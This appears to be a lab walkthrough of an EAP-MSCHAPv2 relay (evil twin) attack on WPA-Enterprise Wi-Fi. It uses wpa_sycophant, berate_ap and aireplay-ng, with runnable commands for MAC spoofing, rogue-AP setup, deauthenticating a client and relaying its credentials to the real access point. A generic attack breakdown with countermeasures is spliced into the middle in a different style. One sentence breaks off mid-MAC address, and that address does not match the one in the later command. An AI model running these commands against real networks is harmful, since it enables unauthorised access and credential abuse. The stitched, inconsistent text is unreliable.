
This attack can be used when EAP method uses MSCHAPv2 for client authentication. It relays challenge/response to the original AP to be able to connect to the network without having to crack MSCHAPv2 credentials.

To perform this challenge we have to do a relay attack. MSCHAPv2 works the same as NetNTLM, so we can reuse the challenge from the AP by forwarding it to the legitimate client and reuse its response to access the real AP. For this we will use “wpa_sycophant”.

First we configure the name of the AP we want to connect to in “wpa_sycophant” and we add the MAC of the fake AP we are going to lift, so if we are going to lift it with wlan1 we put the mac of that interface in “bssid_blacklist”. But first we set the MAC for the BSSID AP.

# WPA/WPA2-Enterprise Evil Twin & EAP-MSCHAPv2 Relay Attack Breakdown

A WPA/WPA2-Enterprise Evil Twin attack combined with an EAP-MSCHAPv2 capture or relay exploits weaknesses in how mobile devices and laptops validate wireless networks and authentication servers.

---

## Step-by-Step Attack Flow

### 1. Rogue Access Point (Evil Twin) Setup
* The attacker deploys a rogue Wi-Fi access point (using software suites like `hostapd-mana` or `eaphammer`).
* This rogue AP broadcasts the exact same Service Set Identifier (SSID) as the target corporate network.
* The attacker often sends spoofed deauthentication frames to disconnect target devices from the legitimate network, forcing them to roam or auto-reconnect to the rogue AP's stronger signal.

### 2. Initiation of the 802.1X / EAP Handshake
* When a target device auto-connects to the rogue AP, it initiates an 802.1X authentication sequence.
* The client device expects an Extensible Authentication Protocol (EAP) exchange, typically utilizing Protected EAP (**PEAP**).

### 3. Server Authentication and Certificate Validation Bypass
* In a standard PEAP exchange, the authentication server presents an SSL/TLS certificate to secure the tunnel.
* The attack relies on a breakdown of server validation, occurring when:
  * The user encounters an untrusted certificate warning and manually clicks "Trust" or "Continue".
  * The client device's Operating System or wireless profile is misconfigured to lack strict Certificate Authority (CA) validation.
* Once the device accepts the rogue server's identity, an encrypted TLS tunnel is established between the client and the rogue AP.

### 4. Capturing the MSCHAPv2 Challenge-Response
* Inside the secure TLS tunnel, the client attempts its inner authentication method: **MSCHAPv2**.
* The rogue AP acts as the authentication endpoint and issues a cryptographic **challenge** to the client.
* The client responds with its **username** and an **MSCHAPv2 response** (a cryptographic hash derived from the user's password/NT hash).
* Because the rogue AP controls the TLS tunnel endpoint, it can decrypt the outer layer and extract this challenge-response exchange directly from the logs.

### 5. Offline Cracking and Exploitation
* The attacker saves the captured username, challenge, and response strings.
* Because the underlying DES encryption used in MSCHAPv2 is structurally weak, the attacker takes these hashes offline.
* Using utilities like `hashcat` or dedicated network cracking suites, the attacker performs dictionary or brute-force attacks to reverse-engineer the response and recover the user's original plaintext corporate password.

---

## Defensive Countermeasures

* **Transition to EAP-TLS:** Replace password-based authentication (PEAP-MSCHAPv2) with certificate-based authentication (**EAP-TLS**). This eliminates passwords entirely, rendering credential-harvesting attacks ineffective.
* **Strict Client Provisioning:** Utilize Mobile Device Management (MDM) or Group Policy Objects (GPO) to enforce strict server certificate validation. Ensure devices are hardcoded to trust only specific corporate CAs and explicit server common names (CNs).


### Practical

in Terminal 1:

```
systemctl stop network-manager
airmon-ng stop wlan1mon
ip link set wlan1 down
macchanger -m F0:9F:C2:00:00:00 wlan1
ip link set wlan1 up
```

```
echo '
network={
  ssid="wifi-regional-tablets"
  ## The SSID you would like to relay and authenticate against. 
  scan_ssid=1
  key_mgmt=WPA-EAP
  ## Do not modify
  identity=""
  anonymous_identity=""
  password=""
  ## This initialises the variables for me.
  ## -------------
  eap=PEAP
  phase1="crypto_binding=0 peaplabel=0"
  phase2="auth=MSCHAPV2"
  ## Dont want to connect back to ourselves,
  ## so add your rogue BSSID here.
  bssid_blacklist=F0:9F:C2:00:00:00
}
' > ~/tools/wpa_sycophant/wpa_sycophant_example.conf
```

```
#Shell 1
cd ~/tools/berate_ap/
./berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout outputMana.log wlan1 lo wifi-regional-tablets
```

We make a deauthentication attack on customers as usual. In this case 1 client uses MFT (802.11w) so it is not vulnerable to this attack, but the other client (64:32:A8:A9:DE

in Terminal 2:

```
# Shell 2
airmon-ng start wlan0
iwconfig wlan0mon channel 44
aireplay-ng -0 0 wlan0mon -a F0:9F:C2:7A:33:28 -c 64:32:A8:AC:53:50
```


in Terminal 3:

```
# Shell 3
cd ~/tools/wpa_sycophant/
./wpa_sycophant.sh -c wpa_sycophant_example.conf -i wlan3
```

When the client connects to the RogueAP wpa_sycophant connects to the real AP.




